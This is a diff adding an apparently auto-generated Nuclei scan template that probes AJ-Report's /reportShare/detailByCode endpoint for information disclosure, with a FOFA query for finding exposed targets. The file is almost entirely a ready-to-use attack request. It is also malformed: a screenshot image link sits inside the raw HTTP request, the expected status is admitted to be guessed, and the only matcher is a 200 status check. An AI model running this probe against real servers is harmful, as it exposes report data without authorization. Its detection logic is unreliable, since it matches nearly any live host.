@@ -1,0 +1,31 @@
+id: poc-grvoad9yog10npov
+info:
+  name: AJ-Report-detailByCode-信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/grvoad9yog10npov
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: grvoad9yog10npov
+    fofa: title="AJ-Report"
+http:
+- raw:
+  - 'GET /reportShare/detailByCode?shareCode=QRK5ta8g HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: close
+
+    Accept-Encoding: gzip
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1718849606232-98c33f9c-9e22-4690-b6e6-72e6a752a925.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
